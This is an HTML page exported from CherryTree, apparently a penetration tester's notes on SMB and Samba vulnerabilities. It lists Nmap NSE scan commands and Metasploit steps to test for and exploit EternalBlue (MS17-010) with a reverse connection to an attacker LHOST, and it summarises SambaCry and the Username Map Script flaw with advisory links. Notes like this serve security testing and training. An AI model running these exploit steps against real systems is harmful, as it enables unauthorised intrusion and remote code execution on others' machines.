<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Vulnerabilities </title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Vulnerabilities </h1><br /><br /><strong>Test with Nmap NSE</strong><br />
    <div class="codebox">
      <div class="codebox">
        nmap&nbsp;--script=&quot;banner,(nbstat&nbsp;or&nbsp;smb*&nbsp;or&nbsp;ssl*)&nbsp;and&nbsp;not&nbsp;(brute&nbsp;or&nbsp;broadcast&nbsp;or&nbsp;dos&nbsp;or&nbsp;external&nbsp;or&nbsp;fuzzer)&quot;&nbsp;-p&nbsp;137,139,445&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>address<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /><br />to test all SMB vulnerabilities(BETTER):<br />
    <div class="codebox">
      <div class="codebox">nmap&nbsp;-script=smb-vuln*&nbsp;-p&nbsp;137,139,445&nbsp;&lt;address&gt;&nbsp;</div>
    </div><br /><br /><br /><br /><br /><br />• <strong>ETERNALBLUE (MS17-010) (CVE-2017-0143)</strong><br /> ◇ Test if
    host is vulnerable<br />
    <div class="codebox">
      <div class="codebox">msfconsole<br />use&nbsp;auxiliary/scanner/smb/smb_ms17_010<br />set&nbsp;rhosts&nbsp;<span
          style="color:#000000;font-weight:400">[</span>ip_target<span style="color:#000000;font-weight:400">]</span>
      </div>
    </div><br /> <a href=""><img src="images/1440-1.png" alt="images/1440-1.png" /></a><br /> ◇ Exploit<br />
    <div class="codebox">
      <div class="codebox">
        use&nbsp;exploit/windows/smb/ms17_010_psexec<br />set&nbsp;RHOSTS&nbsp;[ip_target]<br />set&nbsp;LHOST&nbsp;&nbsp;[ip_attacker_interface]<br />set&nbsp;LPORT&nbsp;[port]<br />exploit
      </div>
    </div><br /> <a href=""><img src="images/1440-2.png" alt="images/1440-2.png" /></a><br /><br /><br /><br /><br />•
    <a href="http://cve.circl.lu/cve/CVE-2017-7494" target="_blank">CVE-2017-7494</a> (referred also as <span
      style="text-decoration:underline;">SambaCry</span>)<br /> Samba since version 3.5.0 and before 4.6.4, 4.5.10 and
    4.4.14 is vulnerable to remote code execution vulnerability, allowing a malicious client to upload a shared library
    to a writable share, and then cause the server to load and execute it.<br />• <a
      href="http://cve.circl.lu/cve/CVE-2007-2447" target="_blank">CVE-2007-2447</a> (referred as <span
      style="text-decoration:underline;">Username Map Script</span>)<br /> Samba since version 3.0.20 and before
    3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1)
    SamrChangePassword function, when the &quot;username map script&quot; smb.conf option is enabled, and allows remote
    authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote
    printer and (3) file share management.<br /> ◇ <span style="text-decoration:underline;">Samba.org explanation of the
      vulnerability</span>: <a
      href="https://www.samba.org/samba/security/CVE-2007-2447.html" target="_blank">https://www.samba.org/samba/security/CVE-2007-2447.html</a><br />
    ◇ <span style="text-decoration:underline;">Metasploit module</span>: <a
      href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_scrip" target="_blank">https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_scrip</a><br /><br /><br />
  </div>
</body>

</html>